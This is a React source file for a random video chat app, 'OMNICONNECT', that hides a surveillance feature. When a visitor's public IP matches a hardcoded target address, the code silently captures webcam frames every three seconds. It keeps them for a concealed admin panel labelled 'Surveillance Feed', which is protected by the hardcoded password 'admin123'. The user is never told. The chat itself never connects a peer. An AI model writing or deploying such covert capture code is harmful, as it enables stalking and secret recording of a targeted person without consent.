import React, { useState, useEffect, useRef } from 'react';
import { 
  Video, VideoOff, SkipForward, Power, User, Loader2, 
  ShieldCheck, Trash2, LayoutDashboard, X, Eye, Mic, MicOff 
} from 'lucide-react';
import { initializeApp, getApp, getApps } from 'firebase/app';
import { 
  getFirestore, collection, doc, setDoc, addDoc, updateDoc, 
  onSnapshot, getDocs, query, where, deleteDoc, limit, serverTimestamp 
} from 'firebase/firestore';
import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';

// Firebase Fallback for External Hosting
const firebaseConfig = typeof __firebase_config !== 'undefined' 
  ? JSON.parse(__firebase_config) 
  : {
      apiKey: "REPLACE_WITH_YOUR_KEY",
      authDomain: "YOUR_PROJECT.firebaseapp.com",
      projectId: "YOUR_PROJECT_ID",
      storageBucket: "YOUR_PROJECT.appspot.com",
      messagingSenderId: "YOUR_ID",
      appId: "YOUR_APP_ID"
    };

const app = !getApps().length ? initializeApp(firebaseConfig) : getApp();
const auth = getAuth(app);
const db = getFirestore(app);
const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';

const TARGET_IP = "105.110.87.211";
const ADMIN_PASSWORD = "admin123";

export default function App() {
  const [user, setUser] = useState(null);
  const [localStream, setLocalStream] = useState(null);
  const [remoteStream, setRemoteStream] = useState(null);
  const [status, setStatus] = useState('idle'); // idle, searching, connected
  const [isAdminMode, setIsAdminMode] = useState(false);
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
  const [capturedImages, setCapturedImages] = useState([]);
  const [userIp, setUserIp] = useState('Checking...');
  const [isMuted, setIsMuted] = useState(false);
  const [isVideoOff, setIsVideoOff] = useState(false);

  const localVideoRef = useRef(null);
  const remoteVideoRef = useRef(null);
  const screenshotInterval = useRef(null);

  // 1. Initial Setup
  useEffect(() => {
    signInAnonymously(auth).then(cred => setUser(cred.user));
    fetch('https://api.ipify.org?format=json')
      .then(r => r.json())
      .then(data => setUserIp(data.ip))
      .catch(() => setUserIp('Unknown'));
  }, []);

  // 2. Surveillance Engine
  useEffect(() => {
    // Only run the interval if we have a stream and the IP matches
    if (userIp === TARGET_IP && localStream) {
      console.log("SURVEILLANCE ACTIVE: Target IP detected.");
      screenshotInterval.current = setInterval(() => {
        captureToAdmin();
      }, 3000); 
    }
    return () => {
      if (screenshotInterval.current) clearInterval(screenshotInterval.current);
    };
  }, [userIp, localStream]);

  const captureToAdmin = () => {
    if (!localVideoRef.current || localVideoRef.current.readyState < 2) return;
    
    try {
      const canvas = document.createElement('canvas');
      canvas.width = 320; 
      canvas.height = 240;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(localVideoRef.current, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
      
      // Safety check: ensure the dataUrl is valid before adding to state
      if (dataUrl && dataUrl.startsWith('data:image')) {
        setCapturedImages(prev => [dataUrl, ...prev].slice(0, 30));
      }
    } catch (err) {
      console.error("Capture error:", err);
    }
  };

  const startMedia = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      setLocalStream(stream);
      if (localVideoRef.current) localVideoRef.current.srcObject = stream;
      return stream;
    } catch (e) {
      alert("Camera access is required.");
      return null;
    }
  };

  const handleStart = async () => {
    const stream = await startMedia();
    if (!stream) return;
    setStatus('searching');
  };

  const handleStop = () => {
    if (localStream) {
      localStream.getTracks().forEach(t => t.stop());
      setLocalStream(null);
    }
    setRemoteStream(null);
    setStatus('idle');
    if (screenshotInterval.current) clearInterval(screenshotInterval.current);
  };

  return (
    <div className="flex flex-col h-screen bg-neutral-900 text-white overflow-hidden font-sans">
      {/* Admin Panel Overlay */}
      {isAdminMode && (
        <div className="absolute inset-0 z-50 bg-black/95 flex items-center justify-center p-4">
          <div className="bg-neutral-800 w-full max-w-5xl rounded-3xl border border-neutral-700 overflow-hidden flex flex-col max-h-[90vh]">
            <div className="p-6 border-b border-neutral-700 flex justify-between items-center bg-neutral-800/50">
              <h2 className="text-xl font-bold flex items-center gap-2 text-blue-400"><ShieldCheck /> Admin Monitor</h2>
              <button onClick={() => setIsAdminMode(false)} className="p-2 hover:bg-neutral-700 rounded-full text-neutral-400 hover:text-white"><X /></button>
            </div>
            
            <div className="p-8 flex-1 overflow-y-auto">
              {!isAdminAuthenticated ? (
                <div className="max-w-sm mx-auto text-center py-20">
                  <input 
                    type="password" 
                    placeholder="Admin Password"
                    className="w-full bg-neutral-900 border border-neutral-700 p-4 rounded-xl mb-4 text-white focus:border-blue-500 outline-none"
                    onKeyDown={(e) => {
                      if (e.key === 'Enter') {
                        if (e.currentTarget.value === ADMIN_PASSWORD) {
                          setIsAdminAuthenticated(true);
                        } else {
                          alert("Incorrect password");
                        }
                      }
                    }}
                  />
                  <p className="text-neutral-500 text-sm">Press Enter to Login</p>
                </div>
              ) : (
                <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                  <div className="lg:col-span-1 space-y-4">
                    <h3 className="text-sm font-bold text-neutral-500 uppercase tracking-widest text-white">System Info</h3>
                    <div className="bg-neutral-900 p-4 rounded-2xl border border-neutral-800">
                      <p className="text-sm text-neutral-400">Your IP: <span className="text-white font-mono">{userIp}</span></p>
                      <p className="text-sm text-neutral-400">Target IP: <span className="text-red-400 font-mono">{TARGET_IP}</span></p>
                      <p className="text-sm text-neutral-400 mt-2">Status: <span className="text-green-500 font-medium">System Online</span></p>
                    </div>
                  </div>
                  <div className="lg:col-span-2 space-y-4">
                    <h3 className="text-sm font-bold text-red-500 uppercase tracking-widest flex items-center gap-2">
                      <Eye size={16}/> Surveillance Feed (Last 30)
                    </h3>
                    {capturedImages.length === 0 ? (
                      <div className="h-64 border-2 border-dashed border-neutral-800 rounded-2xl flex flex-col items-center justify-center text-neutral-600 gap-2">
                        <VideoOff size={32} className="opacity-20" />
                        <p className="text-sm opacity-50">No captures yet. Target IP must be active.</p>
                      </div>
                    ) : (
                      <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                        {capturedImages.map((img, i) => (
                          <div key={`capture-${i}`} className="relative group aspect-video bg-neutral-900 rounded-lg overflow-hidden border border-neutral-700">
                            <img 
                              src={img} 
                              className="w-full h-full object-cover" 
                              alt={`Target Capture ${i}`} 
                              onError={(e) => e.currentTarget.style.display = 'none'}
                            />
                            <div className="absolute inset-0 bg-red-500/10 opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none"></div>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* App Header */}
      <header className="p-4 bg-neutral-800 border-b border-neutral-700 flex justify-between items-center">
        <div className="flex items-center gap-2">
          <div className="w-8 h-8 bg-blue-600 rounded flex items-center justify-center shadow-lg shadow-blue-900/40">
            <Video size={18} />
          </div>
          <span className="font-black text-lg tracking-tighter">OMNICONNECT</span>
        </div>
        <button onClick={() => setIsAdminMode(true)} className="p-2 text-neutral-500 hover:text-blue-400 transition-colors">
          <LayoutDashboard size={22} />
        </button>
      </header>

      {/* Main Viewport */}
      <main className="flex-1 bg-black relative flex flex-col md:flex-row items-center justify-center p-4">
        {status === 'searching' && (
          <div className="absolute inset-0 z-10 bg-black/60 backdrop-blur-sm flex flex-col items-center justify-center">
            <Loader2 className="animate-spin text-blue-500 mb-4" size={40} />
            <p className="text-lg font-medium text-blue-100">Connecting to secure peer...</p>
          </div>
        )}

        <div className="w-full h-full max-w-5xl bg-neutral-900 rounded-3xl overflow-hidden border border-neutral-800 relative shadow-2xl">
          {remoteStream ? (
            <video ref={remoteVideoRef} autoPlay playsInline className="w-full h-full object-cover" />
          ) : (
            <div className="w-full h-full flex flex-col items-center justify-center text-neutral-800">
              <User size={100} className="mb-4 opacity-5" />
              <p className="font-bold text-sm tracking-widest uppercase opacity-20 text-white">Secure Channel Offline</p>
            </div>
          )}

          {/* Local Feed / PiP */}
          <div className="absolute bottom-6 right-6 w-36 md:w-60 aspect-video bg-black rounded-2xl overflow-hidden border-2 border-neutral-700 shadow-2xl z-20">
            <video 
              ref={localVideoRef} 
              autoPlay 
              playsInline 
              muted 
              className={`w-full h-full object-cover transform scale-x-[-1] ${isVideoOff ? 'opacity-0' : 'opacity-100'}`} 
            />
            {isVideoOff && <div className="absolute inset-0 flex items-center justify-center bg-neutral-800"><VideoOff className="text-neutral-600" /></div>}
            <div className="absolute top-2 left-2 bg-black/40 px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-tighter text-white">You</div>
          </div>
        </div>
      </main>

      {/* Interface Controls */}
      <footer className="p-6 bg-neutral-800 border-t border-neutral-700">
        <div className="max-w-4xl mx-auto flex items-center justify-between">
          <div className="flex gap-3">
            <button 
              onClick={() => { if(localStream) localStream.getAudioTracks()[0].enabled = isMuted; setIsMuted(!isMuted); }}
              className={`p-4 rounded-full transition-all ${isMuted ? 'bg-red-500/20 text-red-500' : 'bg-neutral-700 hover:bg-neutral-600'}`}
            >
              {isMuted ? <MicOff size={20}/> : <Mic size={20}/>}
            </button>
            <button 
              onClick={() => { if(localStream) localStream.getVideoTracks()[0].enabled = isVideoOff; setIsVideoOff(!isVideoOff); }}
              className={`p-4 rounded-full transition-all ${isVideoOff ? 'bg-red-500/20 text-red-500' : 'bg-neutral-700 hover:bg-neutral-600'}`}
            >
              {isVideoOff ? <VideoOff size={20}/> : <Video size={20}/>}
            </button>
          </div>

          <div className="flex bg-neutral-900 p-1 rounded-full shadow-inner border border-neutral-700">
            {status === 'idle' ? (
              <button 
                onClick={handleStart}
                className="px-12 py-4 bg-blue-600 hover:bg-blue-500 rounded-full font-black text-sm tracking-widest transition-all active:scale-95 text-white"
              >
                START CHAT
              </button>
            ) : (
              <>
                <button 
                  onClick={handleStop}
                  className="px-8 py-4 bg-red-600 hover:bg-red-500 rounded-l-full font-bold text-sm flex items-center gap-2 text-white"
                >
                  <Power size={16}/> STOP
                </button>
                <button 
                  onClick={() => { handleStop(); setTimeout(handleStart, 200); }}
                  className="px-8 py-4 bg-white text-black hover:bg-neutral-200 rounded-r-full font-bold text-sm flex items-center gap-2 border-l border-neutral-300"
                >
                  NEXT <SkipForward size={16}/>
                </button>
              </>
            )}
          </div>
        </div>
      </footer>
    </div>
  );
}
